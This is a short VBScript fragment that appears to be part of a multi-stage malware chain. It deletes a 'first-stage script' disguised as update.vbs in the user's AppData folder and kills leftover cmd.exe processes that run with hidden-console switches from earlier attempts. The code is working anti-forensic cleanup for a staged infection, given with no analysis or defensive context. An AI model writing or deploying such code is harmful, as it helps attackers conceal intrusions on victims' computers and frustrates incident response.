' Delete the first-stage script:
Set objShell = CreateObject("WScript.Shell")
appDataLocation = objShell.ExpandEnvironmentStrings("%APPDATA%")
Set objFSO = CreateObject("Scripting.FileSystemObject")
FilePath = (appDataLocation & "\update.vbs")
If objFSO.FileExists(FilePath) Then
	objFso.DeleteFile FilePath
End If

' Kill all weird CMD's from any previous attempts: 
Set objWMIService = GetObject("winmgmts://./root/cimv2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE CommandLine LIKE '%cmd.exe"" /Q /D /T:01 /F:OFF /V:ON /K%'")
For Each objItem In colItems
	objItem.Terminate
Next
